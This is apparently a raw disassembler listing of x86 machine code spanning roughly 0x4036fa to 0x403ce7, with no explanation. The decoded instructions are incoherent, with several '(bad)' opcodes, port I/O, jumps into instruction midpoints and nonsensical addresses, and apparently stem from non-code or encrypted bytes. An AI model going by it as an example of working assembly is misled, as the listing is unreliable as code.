  4036fa:	38 15 e0 60 2b a7    	cmp    %dl,0xa72b60e0
  403700:	a8 e5                	test   $0xe5,%al
  403702:	60                   	pusha
  403703:	d4 be                	aam    $0xbe
  403705:	eb ff                	jmp    0x403706
  403707:	6c                   	insb   (%dx),%es:(%edi)
  403708:	2b d0                	sub    %eax,%edx
  40370a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40370b:	e5 7b                	in     $0x7b,%eax
  40370d:	de b4 ab 29 bf ac eb 	fidivs -0x145340d7(%ebx,%ebp,4)
  403714:	e4 3e                	in     $0x3e,%al
  403716:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403717:	e5 60                	in     $0x60,%eax
  403719:	d4 a4                	aam    $0xa4
  40371b:	eb 88                	jmp    0x4036a5
  40371d:	5f                   	pop    %edi
  40371e:	75 e5                	jne    0x403705
  403720:	7b df                	jnp    0x403701
  403722:	8c bd ff be fb 23    	mov    %?,0x23fbbeff(%ebp)
  403728:	30 b3 f6 b7 f5 eb    	xor    %dh,-0x140a480a(%ebx)
  40372e:	99                   	cltd
  40372f:	eb 8a                	jmp    0x4036bb
  403731:	eb 90                	jmp    0x4036c3
  403733:	18 40 82             	sbb    %al,-0x7e(%eax)
  403736:	e0 60                	loopne 0x403798
  403738:	db 65 d4             	(bad) -0x2c(%ebp)
  40373b:	00 e0                	add    %ah,%al
  40373d:	60                   	pusha
  40373e:	af                   	scas   %es:(%edi),%eax
  40373f:	f4                   	hlt
  403740:	63 9b 9d de d3 eb    	arpl   %ebx,-0x142c2163(%ebx)
  403746:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403747:	4e                   	dec    %esi
  403748:	e5 e9                	in     $0xe9,%eax
  40374a:	cd 04                	int    $0x4
  40374c:	55                   	push   %ebp
  40374d:	a0 a0 e5 60 d4       	mov    0xd460e5a0,%al
  403752:	a2 5f 70 e4 7b       	mov    %al,0x7be4705f
  403757:	d4 bb                	aam    $0xbb
  403759:	18 40 82             	sbb    %al,-0x7e(%eax)
  40375c:	e0 60                	loopne 0x4037be
  40375e:	db 65 d4             	(bad) -0x2c(%ebp)
  403761:	00 e0                	add    %ah,%al
  403763:	60                   	pusha
  403764:	14 6e                	adc    $0x6e,%al
  403766:	2b 2f                	sub    (%edi),%ebp
  403768:	2b 35 2b 26 9f 75    	sub    0x759f262b,%esi
  40376e:	d4 00                	aam    $0x0
  403770:	e0 60                	loopne 0x4037d2
  403772:	8b 64 db 5d          	mov    0x5d(%ebx,%ebx,8),%esp
  403776:	1f                   	pop    %ds
  403777:	2d fd bf fe bb       	sub    $0xbbfebffd,%eax
  40377c:	63 01                	arpl   %eax,(%ecx)
  40377e:	40                   	inc    %eax
  40377f:	15 e0 60 25 20       	adc    $0x202560e0,%eax
  403784:	14 6f                	adc    $0x6f,%al
  403786:	2b 70 d3             	sub    -0x2d(%eax),%esi
  403789:	29 2b                	sub    %ebp,(%ebx)
  40378b:	a0 a4 e7 6a 5f       	mov    0x5f6ae7a4,%al
  403790:	b5 94                	mov    $0x94,%ch
  403792:	40                   	inc    %eax
  403793:	a0 a0 23 2d a0       	mov    0xa02d23a0,%al
  403798:	a0 b1 f6 b7 5e       	mov    0x5eb7f6b1,%al
  40379d:	f8                   	clc
  40379e:	55                   	push   %ebp
  40379f:	a0 a0 ed 1d 24       	mov    0x241deda0,%al
  4037a4:	59                   	pop    %ecx
  4037a5:	6b a0 60 a0 53 45 ef 	imul   $0xffffffef,0x4553a060(%eax),%esp
  4037ac:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4037ad:	18 55 a0             	sbb    %dl,-0x60(%ebp)
  4037b0:	a0 ef a5 14 55       	mov    0x5514a5ef,%al
  4037b5:	a0 a0 e9 cd 0c       	mov    0xccde9a0,%al
  4037ba:	55                   	push   %ebp
  4037bb:	a0 a0 e9 bd 10       	mov    0x10bde9a0,%al
  4037c0:	55                   	push   %ebp
  4037c1:	a0 a0 03 40 15       	mov    0x154003a0,%al
  4037c6:	e0 60                	loopne 0x403828
  4037c8:	29 75 48             	sub    %esi,0x48(%ebp)
  4037cb:	15 e0 60 2d ad       	adc    $0xad2d60e0,%eax
  4037d0:	64 e9 ad f8 55 a0    	fs jmp 0xa0963083
  4037d6:	a0 91 69 e3 1d       	mov    0x1de36991,%al
  4037db:	6c                   	insb   (%dx),%es:(%edi)
  4037dc:	a0 d5 a2 eb a8       	mov    0xa8eba2d5,%al
  4037e1:	e9 ad 04 55 a0       	jmp    0xa0953c93
  4037e6:	a0 18 98 70 e0       	mov    0xe0709818,%al
  4037eb:	60                   	pusha
  4037ec:	43                   	inc    %ebx
  4037ed:	70 50                	jo     0x40383f
  4037ef:	a0 a0 18 a8 71       	mov    0x71a818a0,%al
  4037f4:	e0 60                	loopne 0x403856
  4037f6:	43                   	inc    %ebx
  4037f7:	74 50                	je     0x403849
  4037f9:	a0 a0 48 71 5e       	mov    0x5e7148a0,%al
  4037fe:	9f                   	lahf
  4037ff:	5f                   	pop    %edi
  403800:	2b a5 ac a0 42 20    	sub    0x2042a0ac(%ebp),%esp
  403806:	55                   	push   %ebp
  403807:	a0 a0 a8 f9 eb       	mov    0xebf9a8a0,%al
  40380c:	b1 e9                	mov    $0xe9,%cl
  40380e:	b5 1c                	mov    $0x1c,%ch
  403810:	55                   	push   %ebp
  403811:	a0 a0 d4 a7 9c       	mov    0x9ca7d4a0,%al
  403816:	a3 dd a3 5f b4       	mov    %eax,0xb45fa3dd
  40381b:	e1 f1                	loope  0x40380e
  40381d:	eb ec                	jmp    0x40380b
  40381f:	84 a4 e5 69 d4 a8 eb 	test   %ah,-0x14572b97(%ebp,%eiz,8)
  403826:	e5 6c                	in     $0x6c,%eax
  403828:	2b b5 b0 5f 71 b9    	sub    -0x468ea050(%ebp),%esi
  40382e:	2b a5 ac 9c a3 dc    	sub    -0x235c6354(%ebp),%esp
  403834:	a3 5f b4 e1 23       	mov    %eax,0x23e1b45f
  403839:	9d                   	popf
  40383a:	bc 10 e0 60 a0       	mov    $0xa060e010,%esp
  40383f:	d5 ad                	aad    $0xad
  403841:	26 a5                	movsl  %es:(%esi),%es:(%edi)
  403843:	84 50 a0             	test   %dl,-0x60(%eax)
  403846:	a0 61 79 9d b0       	mov    0xb09d7961,%al
  40384b:	00 e0                	add    %ah,%al
  40384d:	60                   	pusha
  40384e:	2b a5 ac a8 af e5    	sub    -0x1a505754(%ebp),%esp
  403854:	d9 60 a0             	fldenv -0x60(%eax)
  403857:	60                   	pusha
  403858:	88 80 9f 5f 9f 22    	mov    %al,0x229f5f9f(%eax)
  40385e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40385f:	60                   	pusha
  403860:	63 91 60 e7 a5 60    	arpl   %edx,0x60a5e760(%ecx)
  403866:	40                   	inc    %eax
  403867:	a0 a0 57 78 79       	mov    0x797857a0,%al
  40386c:	60                   	pusha
  40386d:	a0 5f f8 55 a0       	mov    0xa055f85f,%al
  403872:	a0 eb ff 78 2b       	mov    0x2b78ffeb,%al
  403877:	cf                   	iret
  403878:	b4 5f                	mov    $0x5f,%ah
  40387a:	17                   	pop    %ss
  40387b:	7c 9f                	jl     0x40381c
  40387d:	d7                   	xlat   %ds:(%ebx)
  40387e:	c0 eb d7             	shr    $0xd7,%bl
  403881:	19 ab 60 a0 60 93    	sbb    %ebp,-0x6c9f5fa0(%ebx)
  403887:	05 ff be 69 22       	add    $0x2269beff,%eax
  40388c:	ac                   	lods   %ds:(%esi),%al
  40388d:	60                   	pusha
  40388e:	63 eb                	arpl   %ebp,%ebx
  403890:	60                   	pusha
  403891:	b3 f6                	mov    $0xf6,%bl
  403893:	b7 f5                	mov    $0xf5,%bh
  403895:	1b 38                	sbb    (%eax),%edi
  403897:	15 e0 60 5e 60       	adc    $0x605e60e0,%eax
  40389c:	40                   	inc    %eax
  40389d:	a0 a0 1f c8 10       	mov    0x10c81fa0,%al
  4038a2:	e0 60                	loopne 0x403904
  4038a4:	20 db                	and    %bl,%bl
  4038a6:	c8 60 15 76          	enter  $0x1560,$0x76
  4038aa:	23 9f a0 d4 b1 eb    	and    -0x144e2b60(%edi),%ebx
  4038b0:	b7 e9                	mov    $0xe9,%bh
  4038b2:	70 93                	jo     0x403847
  4038b4:	72 e9                	jb     0x40389f
  4038b6:	b7 eb                	mov    $0xeb,%bh
  4038b8:	88 5f 75             	mov    %bl,0x75(%edi)
  4038bb:	e3 df                	jecxz  0x40389c
  4038bd:	60                   	pusha
  4038be:	15 4f 23 9d a4       	adc    $0xa49d234f,%eax
  4038c3:	00 e0                	add    %ah,%al
  4038c5:	60                   	pusha
  4038c6:	a0 d4 a6 5f b5       	mov    0xb55fa6d4,%al
  4038cb:	f0 40                	lock inc %eax
  4038cd:	a0 a0 e0 1b 88       	mov    0x881be0a0,%al
  4038d2:	a2 d5 aa e3 de       	mov    %al,0xdee3aad5
  4038d7:	60                   	pusha
  4038d8:	15 65 d3 20 29       	adc    $0x2920d365,%eax
  4038dd:	a3 ac 5f b5 98       	mov    %eax,0x98b55fac
  4038e2:	40                   	inc    %eax
  4038e3:	a0 a0 e0 1b 88       	mov    0x881be0a0,%al
  4038e8:	a1 d6 a5 e3 de       	mov    0xdee3a5d6,%eax
  4038ed:	60                   	pusha
  4038ee:	14 82                	adc    $0x82,%al
  4038f0:	2b a3 b0 e5 60 d4    	sub    -0x2b9f1a50(%ebx),%esp
  4038f6:	bb 5f b5 88 40       	mov    $0x4088b55f,%ebx
  4038fb:	a0 a0 eb f3 70       	mov    0x70f3eba0,%al
  403900:	2b a2 b0 9b e2 64    	sub    0x64e29bb0(%edx),%esp
  403906:	14 6a                	adc    $0x6a,%al
  403908:	25 20 14 66 f0       	and    $0xf0661420,%eax
  40390d:	48                   	dec    %eax
  40390e:	97                   	xchg   %eax,%edi
  40390f:	4b                   	dec    %ebx
  403910:	9f                   	lahf
  403911:	5f                   	pop    %edi
  403912:	9f                   	lahf
  403913:	75 dc                	jne    0x4038f1
  403915:	00 e0                	add    %ah,%al
  403917:	60                   	pusha
  403918:	20 db                	and    %bl,%bl
  40391a:	c8 61 15 63          	enter  $0x1561,$0x63
  40391e:	9f                   	lahf
  40391f:	b3 c4                	mov    $0xc4,%bl
  403921:	e0 1b                	loopne 0x40393e
  403923:	88 a0 d4 a5 48 d5    	mov    %ah,-0x2ab75a2c(%eax)
  403929:	5f                   	pop    %edi
  40392a:	9f                   	lahf
  40392b:	5f                   	pop    %edi
  40392c:	23 9b a0 d5 b7 e3    	and    -0x1c482a60(%ebx),%ebx
  403932:	dd 78 50             	fnstsw 0x50(%eax)
  403935:	a0 a0 60 14 66       	mov    0x661460a0,%al
  40393a:	9f                   	lahf
  40393b:	75 b8                	jne    0x4038f5
  40393d:	10 e0                	adc    %ah,%al
  40393f:	60                   	pusha
  403940:	2b 66 f0             	sub    -0x10(%esi),%esp
  403943:	48                   	dec    %eax
  403944:	19 4c 9f 5f          	sbb    %ecx,0x5f(%edi,%ebx,4)
  403948:	2b 63 f6             	sub    -0xa(%ebx),%esp
  40394b:	eb 90                	jmp    0x4038dd
  40394d:	eb 9b                	jmp    0x4038ea
  40394f:	19 ab 60 a0 60 93    	sbb    %ebp,-0x6c9f5fa0(%ebx)
  403955:	05 fe 49 13 5f       	add    $0x5f1349fe,%eax
  40395a:	9f                   	lahf
  40395b:	5f                   	pop    %edi
  40395c:	fd                   	std
  40395d:	bf fe bb 63 03       	mov    $0x363bbfe,%edi
  403962:	a0 00 e0 60 88       	mov    0x8860e000,%al
  403967:	86 9f 5f 9f 23 30    	xchg   %bl,0x30239f5f(%edi)
  40396d:	ef                   	out    %eax,(%dx)
  40396e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40396f:	64 40                	fs inc %eax
  403971:	a0 a0 49 89 5f       	mov    0x5f8949a0,%al
  403976:	9f                   	lahf
  403977:	5f                   	pop    %edi
  403978:	63 eb                	arpl   %ebp,%ebx
  40397a:	b0 e5                	mov    $0xe5,%al
  40397c:	72 d4                	jb     0x403952
  40397e:	bb 27 a0 60 a0       	mov    $0xa060a027,%ebx
  403983:	60                   	pusha
  403984:	a0 eb ea 58 e9       	mov    0xe958eaeb,%al
  403989:	dc af 5f ea 58 15    	fsubrl 0x1558ea5f(%edi)
  40398f:	6a f0                	push   $0xfffffff0
  403991:	ed                   	in     (%dx),%eax
  403992:	e2 58                	loop   0x4039ec
  403994:	88 28                	mov    %ch,(%eax)
  403996:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  403999:	b8 63 eb 60 b3       	mov    $0xb360eb63,%eax
  40399e:	f6 e9                	imul   %cl
  4039a0:	63 e9                	arpl   %ebp,%ecx
  4039a2:	76 eb                	jbe    0x40398f
  4039a4:	b3 e5                	mov    $0xe5,%bl
  4039a6:	72 d4                	jb     0x40397c
  4039a8:	b9 27 a3 60 a0       	mov    $0xa060a327,%ecx
  4039ad:	60                   	pusha
  4039ae:	a0 eb ea 58 e9       	mov    0xe958eaeb,%al
  4039b3:	dc ad 5f ea 58 15    	fsubrl 0x1558ea5f(%ebp)
  4039b9:	68 2d a2 98 48       	push   $0x4898a22d
  4039be:	3f                   	aas
  4039bf:	4c                   	dec    %esp
  4039c0:	9f                   	lahf
  4039c1:	5f                   	pop    %edi
  4039c2:	23 23                	and    (%ebx),%esp
  4039c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4039c5:	ae                   	scas   %es:(%edi),%al
  4039c6:	15 3b fe bb 63       	adc    $0x63bbfe3b,%eax
  4039cb:	eb 60                	jmp    0x403a2d
  4039cd:	e5 72                	in     $0x72,%eax
  4039cf:	d4 c3                	aam    $0xc3
  4039d1:	eb ea                	jmp    0x4039bd
  4039d3:	58                   	pop    %eax
  4039d4:	e1 df                	loope  0x4039b5
  4039d6:	ba b0 f2 eb e2       	mov    $0xe2ebf2b0,%edx
  4039db:	5c                   	pop    %esp
  4039dc:	88 b8 a0 60 a0 e9    	mov    %bh,-0x165f9f60(%eax)
  4039e2:	62 b8 f2 eb e8 5c    	bound  %edi,0x5ce8ebf2(%eax)
  4039e8:	88 08                	mov    %cl,(%eax)
  4039ea:	8d 5f 9f             	lea    -0x61(%edi),%ebx
  4039ed:	ba f8 4b a3 5f       	mov    $0x5fa34bf8,%edx
  4039f2:	e2 58                	loop   0x403a4c
  4039f4:	27                   	daa
  4039f5:	70 25                	jo     0x403a1c
  4039f7:	32 14 73             	xor    (%ebx,%esi,2),%dl
  4039fa:	2b aa 98 a9 1c 6d    	sub    0x6d1ca998(%edx),%ebp
  403a00:	9f                   	lahf
  403a01:	aa                   	stos   %al,%es:(%edi)
  403a02:	98                   	cwtl
  403a03:	d5 a8                	aad    $0xa8
  403a05:	ed                   	in     (%dx),%eax
  403a06:	e2 58                	loop   0x403a60
  403a08:	88 b4 8c 5f 9f 23 2d 	mov    %dh,0x2d239f5f(%esp,%ecx,4)
  403a0f:	a0 a0 e5 72 d4       	mov    0xd472e5a0,%al
  403a14:	a9 eb ea 58 e1       	test   $0xe158eaeb,%eax
  403a19:	de a3 5f e2 58 27    	fisubs 0x2758e25f(%ebx)
  403a1f:	70 25                	jo     0x403a46
  403a21:	32 14 73             	xor    (%ebx,%esi,2),%dl
  403a24:	2b aa 98 a9 1c 6d    	sub    0x6d1ca998(%edx),%ebp
  403a2a:	9f                   	lahf
  403a2b:	aa                   	stos   %al,%es:(%edi)
  403a2c:	98                   	cwtl
  403a2d:	d5 a8                	aad    $0xa8
  403a2f:	ed                   	in     (%dx),%eax
  403a30:	e2 58                	loop   0x403a8a
  403a32:	88 8a 8c 5f 9f 23    	mov    %cl,0x239f5f8c(%edx)
  403a38:	30 e5                	xor    %ah,%ch
  403a3a:	60                   	pusha
  403a3b:	de c4                	faddp  %st,%st(4)
  403a3d:	b0 23                	mov    $0x23,%al
  403a3f:	20 aa e3 80 5e f0    	and    %ch,-0xfa17f1d(%edx)
  403a45:	48                   	dec    %eax
  403a46:	9f                   	lahf
  403a47:	4b                   	dec    %ebx
  403a48:	9f                   	lahf
  403a49:	5f                   	pop    %edi
  403a4a:	fa                   	cli
  403a4b:	c6                   	(bad)
  403a4c:	67 a4                	movsb  %ds:(%si),%es:(%di)
  403a4e:	a2 5e a0 60 23       	mov    %al,0x2360a05e
  403a53:	20 a8 ba 29 b0 9c    	and    %ch,-0x634fd646(%eax)
  403a59:	27                   	daa
  403a5a:	e0 58                	loopne 0x403ab4
  403a5c:	a1 60 a0 60 63       	mov    0x6360a060,%eax
  403a61:	91                   	xchg   %eax,%ecx
  403a62:	60                   	pusha
  403a63:	23 30                	and    (%eax),%esi
  403a65:	b3 f6                	mov    $0xf6,%bl
  403a67:	b7 29                	mov    $0x29,%bh
  403a69:	23 29                	and    (%ecx),%ebp
  403a6b:	36 29 2f             	sub    %ebp,%ss:(%edi)
  403a6e:	29 58 88             	sub    %ebx,-0x78(%eax)
  403a71:	24 9f                	and    $0x9f,%al
  403a73:	5f                   	pop    %edi
  403a74:	9f                   	lahf
  403a75:	e9 99 e9 67 e5       	jmp    0xe5a82413
  403a7a:	96                   	xchg   %eax,%esi
  403a7b:	d4 a9                	aam    $0xa9
  403a7d:	e9 62 e9 90 48       	jmp    0x48d123e4
  403a82:	af                   	scas   %es:(%edi),%eax
  403a83:	4d                   	dec    %ebp
  403a84:	9f                   	lahf
  403a85:	5f                   	pop    %edi
  403a86:	29 38                	sub    %edi,(%eax)
  403a88:	88 4c 9e 5f          	mov    %cl,0x5f(%esi,%ebx,4)
  403a8c:	9f                   	lahf
  403a8d:	e9 db bf fe bb       	jmp    0xbc3efa6d
  403a92:	63 eb                	arpl   %ebp,%ebx
  403a94:	60                   	pusha
  403a95:	b2 29                	mov    $0x29,%dl
  403a97:	42                   	inc    %edx
  403a98:	59                   	pop    %ecx
  403a99:	61                   	popa
  403a9a:	a0 60 a0 48 63       	mov    0x6348a060,%al
  403a9f:	5f                   	pop    %edi
  403aa0:	9f                   	lahf
  403aa1:	5f                   	pop    %edi
  403aa2:	fa                   	cli
  403aa3:	23 30                	and    (%eax),%esi
  403aa5:	91                   	xchg   %eax,%ecx
  403aa6:	69 e5 72 d4 c1 b2    	imul   $0xb2c1d472,%ebp,%esp
  403aac:	da 6a 14             	fisubrl 0x14(%edx)
  403aaf:	77 da                	ja     0x403a8b
  403ab1:	aa                   	stos   %al,%es:(%edi)
  403ab2:	a1 d4 b1 9a ea       	mov    0xea9ab1d4,%eax
  403ab7:	62 14 6b             	bound  %edx,(%ebx,%ebp,2)
  403aba:	da aa a3 d4 a5 e3    	fisubrl -0x1c5a2b5d(%edx)
  403ac0:	62 64 8b 48          	bound  %esp,0x48(%ebx,%ecx,4)
  403ac4:	e2 a2                	loop   0x403a68
  403ac6:	e2 e9                	loop   0x403ab1
  403ac8:	71 ba                	jno    0x403a84
  403aca:	c9                   	leave
  403acb:	31 89 f4 9f 5f 9f    	xor    %ecx,-0x60a0600c(%ecx)
  403ad1:	23 2d a0 a0 91 69    	and    0x6991a0a0,%ebp
  403ad7:	ea aa a2 89 e6 9f 5f 	ljmp   $0x5f9f,$0xe689a2aa
  403ade:	9f                   	lahf
  403adf:	23 30                	and    (%eax),%esi
  403ae1:	b7 f0                	mov    $0xf0,%bh
  403ae3:	b1 29                	mov    $0x29,%cl
  403ae5:	37                   	aaa
  403ae6:	d1 20                	shll   $1,(%eax)
  403ae8:	92                   	xchg   %eax,%edx
  403ae9:	0e                   	push   %cs
  403aea:	15 62 97 31 f8       	adc    $0xf8319762,%eax
  403aef:	61                   	popa
  403af0:	61                   	popa
  403af1:	b8 ff 49 0d 5f       	mov    $0x5f0d49ff,%eax
  403af6:	9f                   	lahf
  403af7:	5f                   	pop    %edi
  403af8:	63 e5                	arpl   %esp,%ebp
  403afa:	60                   	pusha
  403afb:	d4 a3                	aam    $0xa3
  403afd:	eb e0                	jmp    0x403adf
  403aff:	5c                   	pop    %esp
  403b00:	63 e5                	arpl   %esp,%ebp
  403b02:	72 d4                	jb     0x403ad8
  403b04:	df eb                	fucomip %st(3),%st
  403b06:	a8 e5                	test   $0xe5,%al
  403b08:	69 6f 24 1e 9e 5f 9f 	imul   $0x9f5f9e1e,0x24(%edi),%ebp
  403b0f:	b3 f6                	mov    $0xf6,%bl
  403b11:	b7 29                	mov    $0x29,%bh
  403b13:	23 29                	and    (%ecx),%ebp
  403b15:	36 2b d9             	ss sub %ecx,%ebx
  403b18:	9c                   	pushf
  403b19:	eb f6                	jmp    0x403b11
  403b1b:	5c                   	pop    %esp
  403b1c:	a1 5a d9 2e 14       	mov    0x142ed95a,%eax
  403b21:	77 88                	ja     0x403aab
  403b23:	56                   	push   %esi
  403b24:	a2 60 a0 e9 90       	mov    %al,0x90e9a060
  403b29:	eb ee                	jmp    0x403b19
  403b2b:	5c                   	pop    %esp
  403b2c:	2b 73 a1             	sub    -0x5f(%ebx),%esi
  403b2f:	5a                   	pop    %edx
  403b30:	88 c0                	mov    %al,%al
  403b32:	8c 5f 9f             	mov    %ds,-0x61(%edi)
  403b35:	bf fe bb 63 48       	mov    $0x4863bbfe,%edi
  403b3a:	7f 62                	jg     0x403b9e
  403b3c:	a0 60 2b 63 29       	mov    0x29632b60,%al
  403b41:	59                   	pop    %ecx
  403b42:	8b 48 63             	mov    0x63(%eax),%ecx
  403b45:	e5 72                	in     $0x72,%eax
  403b47:	d4 01                	aam    $0x1
  403b49:	e5 69                	in     $0x69,%eax
  403b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403b4c:	24 dc                	and    $0xdc,%al
  403b4e:	9e                   	sahf
  403b4f:	5f                   	pop    %edi
  403b50:	9f                   	lahf
  403b51:	9b                   	fwait
  403b52:	b0 d4                	mov    $0xd4,%al
  403b54:	fc                   	cld
  403b55:	9b                   	fwait
  403b56:	a8 d4                	test   $0xd4,%al
  403b58:	ae                   	scas   %es:(%edi),%al
  403b59:	b0 f1                	mov    $0xf1,%al
  403b5b:	48                   	dec    %eax
  403b5c:	0d 5e 9f 5f fa       	or     $0xfa5f9f5e,%eax
  403b61:	b8 89 fa 9f 5f       	mov    $0x5f9ffa89,%eax
  403b66:	9f                   	lahf
  403b67:	b3 f6                	mov    $0xf6,%bl
  403b69:	b7 29                	mov    $0x29,%bh
  403b6b:	33 29                	xor    (%ecx),%ebp
  403b6d:	2e f0 eb e3          	cs lock jmp 0x403b54
  403b71:	5c                   	pop    %esp
  403b72:	a3 a6 9c 48 5f       	mov    %eax,0x5f489ca6
  403b77:	5e                   	pop    %esi
  403b78:	9f                   	lahf
  403b79:	5f                   	pop    %edi
  403b7a:	29 27                	sub    %esp,(%edi)
  403b7c:	29 22                	sub    %esp,(%edx)
  403b7e:	29 38                	sub    %edi,(%eax)
  403b80:	2b ab 9c 48 ad 4c    	sub    0x4cad489c(%ebx),%ebp
  403b86:	9f                   	lahf
  403b87:	5f                   	pop    %edi
  403b88:	29 5a 29             	sub    %ebx,0x29(%edx)
  403b8b:	50                   	push   %eax
  403b8c:	2b ae 9c 63 f3 5c    	sub    0x5cf3639c(%esi),%ebp
  403b92:	88 5e 8b             	mov    %bl,-0x75(%esi)
  403b95:	5f                   	pop    %edi
  403b96:	9f                   	lahf
  403b97:	b8 29 5a 25 5f       	mov    $0x5f255a29,%eax
  403b9c:	14 63                	adc    $0x63,%al
  403b9e:	9f                   	lahf
  403b9f:	af                   	scas   %es:(%edi),%eax
  403ba0:	98                   	cwtl
  403ba1:	48                   	dec    %eax
  403ba2:	c7                   	(bad)
  403ba3:	5e                   	pop    %esi
  403ba4:	9f                   	lahf
  403ba5:	5f                   	pop    %edi
  403ba6:	ff                   	(bad)
  403ba7:	be fb 23 29 2a       	mov    $0x2a2923fb,%esi
  403bac:	89 7c 9e 5f          	mov    %edi,0x5f(%esi,%ebx,4)
  403bb0:	9f                   	lahf
  403bb1:	e9 6a 49 e9 5f       	jmp    0x60298520
  403bb6:	9f                   	lahf
  403bb7:	5f                   	pop    %edi
  403bb8:	63 b3 f6 b7 f2 b0    	arpl   %esi,-0x4f0d480a(%ebx)
  403bbe:	29 33                	sub    %esi,(%ebx)
  403bc0:	d1 5f 2b             	rcrl   $1,0x2b(%edi)
  403bc3:	ac                   	lods   %ds:(%esi),%al
  403bc4:	34 74                	xor    $0x74,%al
  403bc6:	25 29 14 66 d9       	and    $0xd9661429,%eax
  403bcb:	68 15 62 29 27       	push   $0x27296215
  403bd0:	d1 20                	shll   $1,(%eax)
  403bd2:	2b ac 34 74 25 29 14 	sub    0x14292574(%esp,%esi,1),%ebp
  403bd9:	69 a3 a1 9c 99 6f d5 	imul   $0x9f91a2d5,0x6f999ca1(%ebx),%esp
  403be0:	a2 91 9f 
  403be3:	aa                   	stos   %al,%es:(%edi)
  403be4:	15 4c 25 5f 14       	adc    $0x145f254c,%eax
  403be9:	74 29                	je     0x403c14
  403beb:	22 29                	and    (%ecx),%ch
  403bed:	58                   	pop    %eax
  403bee:	2b 97 2b d6 9c 48    	sub    0x489cd62b(%edi),%edx
  403bf4:	c5 62 a0             	lds    -0x60(%edx),%esp
  403bf7:	60                   	pusha
  403bf8:	f7 63 d7             	mull   -0x29(%ebx)
  403bfb:	ab                   	stos   %eax,%es:(%edi)
  403bfc:	8b 68 88             	mov    -0x78(%eax),%ebp
  403bff:	96                   	xchg   %eax,%esi
  403c00:	9e                   	sahf
  403c01:	5f                   	pop    %edi
  403c02:	9f                   	lahf
  403c03:	b0 29                	mov    $0x29,%al
  403c05:	26 2b a4 3c 78 29 52 	sub    %es:0x25522978(%esp,%edi,1),%esp
  403c0c:	25 
  403c0d:	20 14 6a             	and    %dl,(%edx,%ebp,2)
  403c10:	2b a8 9c 61 6e 48    	sub    0x486e619c(%eax),%ebp
  403c16:	1b 4b 9f             	sbb    -0x61(%ebx),%ecx
  403c19:	5f                   	pop    %edi
  403c1a:	eb d5                	jmp    0x403bf1
  403c1c:	89 ba f8 e5 9f d5    	mov    %edi,-0x2a601a08(%edx)
  403c22:	ac                   	lods   %ds:(%esi),%al
  403c23:	e5 72                	in     $0x72,%eax
  403c25:	d4 a3                	aam    $0xa3
  403c27:	5f                   	pop    %edi
  403c28:	ea 58 88 fe 9d 5f 9f 	ljmp   $0x9f5f,$0x9dfe8858
  403c2f:	ba ff be fb b8       	mov    $0xb8fbbeff,%edx
  403c34:	2d 84 34 5f 80       	sub    $0x805f3484,%eax
  403c39:	23 2d a0 a0 b3 f6    	and    0xf6b3a0a0,%ebp
  403c3f:	b7 29                	mov    $0x29,%bh
  403c41:	26 29 37             	sub    %esi,%es:(%edi)
  403c44:	d9 30                	fnstenv (%eax)
  403c46:	af                   	scas   %es:(%edi),%eax
  403c47:	e4 2f                	in     $0x2f,%al
  403c49:	60                   	pusha
  403c4a:	a0 60 25 56 14       	mov    0x14562560,%al
  403c4f:	c8 25 5f 14          	enter  $0x5f25,$0x14
  403c53:	cb                   	lret
  403c54:	2b a6 9c eb f7 5c    	sub    0x5cf7eb9c(%esi),%esp
  403c5a:	c9                   	leave
  403c5b:	30 17                	xor    %dl,(%edi)
  403c5d:	62 a1 22 f2 21 8a    	bound  %esp,-0x75de0dde(%ecx)
  403c63:	62 14 86             	bound  %edx,(%esi,%eax,4)
  403c66:	2b 6e 2b             	sub    0x2b(%esi),%ebp
  403c69:	7f d9                	jg     0x403c44
  403c6b:	39 15 b8 ea d4 b5    	cmp    %edx,0xb5d4eab8
  403c71:	eb ee                	jmp    0x403c61
  403c73:	64 2b bf a4 99 79 d5 	sub    %fs:-0x2a86665c(%edi),%edi
  403c7a:	eb e3                	jmp    0x403c5f
  403c7c:	66 68 23 27          	pushw  $0x2723
  403c80:	a8 aa                	test   $0xaa,%al
  403c82:	15 42 8b 66 23       	adc    $0x23668b42,%eax
  403c87:	26 a4                	movsb  %es:(%esi),%es:(%edi)
  403c89:	e3 67                	jecxz  0x403cf2
  403c8b:	64 fa                	fs cli
  403c8d:	e3 82                	jecxz  0x403c11
  403c8f:	63 14 82             	arpl   %edx,(%edx,%eax,4)
  403c92:	2b 6e 2b             	sub    0x2b(%esi),%ebp
  403c95:	7f d8                	jg     0x403c6f
  403c97:	39 15 a1 ea d4 b7    	cmp    %edx,0xb7d4eaa1
  403c9d:	98                   	cwtl
  403c9e:	9d                   	popf
  403c9f:	d5 da                	aad    $0xda
  403ca1:	aa                   	stos   %al,%es:(%edi)
  403ca2:	14 70                	adc    $0x70,%al
  403ca4:	21 43 a0             	and    %eax,-0x60(%ebx)
  403ca7:	60                   	pusha
  403ca8:	9f                   	lahf
  403ca9:	60                   	pusha
  403caa:	21 41 a0             	and    %eax,-0x60(%ecx)
  403cad:	60                   	pusha
  403cae:	9f                   	lahf
  403caf:	60                   	pusha
  403cb0:	d9 39                	fnstcw (%ecx)
  403cb2:	15 87 a1 20 8b       	adc    $0x8b20a187,%eax
  403cb7:	83 2b b7             	subl   $0xffffffb7,(%ebx)
  403cba:	9c                   	pushf
  403cbb:	89 70 4b             	mov    %esi,0x4b(%eax)
  403cbe:	bc eb e6 5c c9       	mov    $0xc95ce6eb,%esp
  403cc3:	30 8b 75 fa 98 79    	xor    %cl,0x7998fa75(%ebx)
  403cc9:	d5 b0                	aad    $0xb0
  403ccb:	98                   	cwtl
  403ccc:	9d                   	popf
  403ccd:	d5 ac                	aad    $0xac
  403ccf:	21 89 70 61 4b b0    	and    %ecx,-0x4fb49e90(%ecx)
  403cd5:	98                   	cwtl
  403cd6:	79 d5                	jns    0x403cad
  403cd8:	a2 98 9d bf fe       	mov    %al,0xfebf9d98
  403cdd:	bb 63 eb 60 e5       	mov    $0xe560eb63,%ebx
  403ce2:	60                   	pusha
  403ce3:	d4 a9                	aam    $0xa9
  403ce5:	eb f0                	jmp    0x403cd7
  403ce7:	58                   	pop    %eax
